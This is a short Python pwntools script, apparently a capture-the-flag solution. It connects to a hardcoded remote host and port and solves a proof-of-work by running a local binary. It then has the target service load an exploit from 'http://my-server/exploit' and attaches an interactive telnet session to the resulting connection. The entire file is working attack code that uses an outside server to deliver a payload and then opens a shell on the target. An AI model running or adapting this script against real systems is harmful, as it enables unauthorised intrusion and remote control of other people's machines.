from pwn import *

HOST, PORT = "134.209.40.42", "1337"
# HOST, PORT = "0.0.0.0", 31338
r = remote(HOST, PORT)

menu = lambda: r.recvuntil(": ")
ii = lambda x: r.sendline(str(x))
go = lambda x: (menu(), ii(x))[0]

data=menu().split(' == ')[1].split('\n')[0].strip()
print data
r.sendline(os.popen('~/pow %s' % data).read())
ii('y')
go('http://my-server/exploit')
import telnetlib
t=telnetlib.Telnet()
t.sock = r.sock
t.interact()
